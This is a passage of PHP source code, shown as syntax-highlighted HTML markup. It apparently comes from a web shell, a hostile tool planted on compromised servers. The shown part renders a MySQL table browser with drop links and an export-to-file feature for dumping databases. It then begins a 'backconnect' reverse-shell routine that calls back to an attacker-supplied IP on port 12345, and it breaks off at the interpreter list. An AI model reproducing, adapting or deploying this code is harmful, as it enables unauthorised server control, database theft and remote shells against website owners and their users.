<\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Data_length'<\/span>] = <span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Data_length'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">table_num<\/span>++;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledb<\/span>[] = $<span style=\"color: #ffcc66;\">table<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">data_size<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">sizecount(<\/span>$<span style=\"color: #ffcc66;\">data_size<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #ffcc66;\">table<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"POST\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td width=\"2%\" align=\"center\"&gt;&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Name&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Rows&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Data_length&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Create_time&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Update_time&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">highver<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Engine&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Collation&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Operate&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span> ($<span style=\"color: #ffcc66;\">tabledb<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span> =&gt; $<span style=\"color: #ffcc66;\">table<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">thisbg<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"'<\/span>.$<span style=\"color: #ffcc66;\">thisbg<\/span>.<span style=\"color: #66cccc;\">'\" onmouseover=\"this.className=\\'foc<\/span><span style=\"color: #66cccc; text-decoration: underline;\">us\\';\" onmouseout=\"this.className=\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">thisbg<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\';\"&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td align=\"center\" width=\"2%\"&gt;&lt;input type=\"checkbox\" name<\/span><span style=\"color: #66cccc; text-decoration: underline;\">=\"table[]\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">table<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Name'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" \/&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&lt;a href=\"javascript:settable(\\''<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Name'<\/span>].<span style=\"color: #66cccc;\">'\\');<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">table<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Name'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Rows'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Data_length'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Create_time'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Update_time'<\/span>].<span style=\"color: #66cccc;\">'&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">highver<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Engine'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Collation'<\/span>].<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&lt;a href=\"javascript:settable(\\''<\/span>.$<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Name'<\/span>].<span style=\"color: #66cccc;\">'\\', <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\\'insert\\');\"&gt;Insert&lt;\/a&gt; | &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">table<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Name'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'structure\\');\"&gt;Structure&lt;\/a&gt; | &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">table<\/span><span style=\"text-decoration: underline;\">[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Name'<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'drop\\');\"&gt;Drop&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td width=\"2%\" align=\"center\"&gt;&lt;input name=\"chkall\" value=\"on\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> type=\"checkbox\" onclick=\"CheckAll(this.form)\" \/&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Name&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Rows&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Data_length&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Create_time&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Update_time&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">highver<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Engine&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Collation&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Operate&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class='<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">'&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Total tables: '<\/span>.$<span style=\"color: #ffcc66;\">table_num<\/span>.<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">table_rows<\/span>.<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;'<\/span>.$<span style=\"color: #ffcc66;\">data_size<\/span>.<span style=\"color: #66cccc;\">'&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td colspan=\"'<\/span>.($<span style=\"color: #ffcc66;\">highver<\/span> ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">3<\/span>).<span style=\"color: #66cccc;\">'\"&gt;&amp;nbsp;&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;tr class=\\\"\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">bg(<\/span>).<span style=\"color: #66cccc;\">\"\\\"&gt;&lt;td colspan=\\\"\"<\/span>.($<span style=\"color: #ffcc66;\">highver<\/span> ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">9<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">7<\/span>).<span style=\"color: #66cccc;\">\"\\\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt;&lt;input name=\\\"saveasfile\\\" value=\\\"1\\\" type=\\\"checkbox\\\" \/&gt; Save as file &lt;input class=\\\"input\\\" name=\\\"path\\\" value=\\\"\"<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #f2777a; font-weight: bold; text-decoration: underline;\">SA_ROOT<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dbname<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\".sql\\\" type=\\\"text\\\" size=\\\"60\\\" \/&gt; &lt;input class=\\\"bt\\\" type=\\\"submit\\\" value=\\\"Export selection table\\\" \/&gt;&lt;\/td&gt;&lt;\/tr&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>,<span style=\"color: #66cccc;\">'backupmysql'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;\/table&gt;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">fr(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">tbfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_close(<\/span>);\n}<span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">end mysql<\/span>\n\n<span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'backconnect'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">yourip<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">yourip<\/span> = $<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'REMOTE_ADDR'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   !$<span style=\"color: #ffcc66;\">yourport<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">yourport<\/span> = <span style=\"color: #66cccc;\">'12345'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">usedb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span><span style=\"color: #66cccc;\">'perl'<\/span>=&gt;<span style=\"color: #66cccc;\">'perl'<\/span>,<span style=\"color: 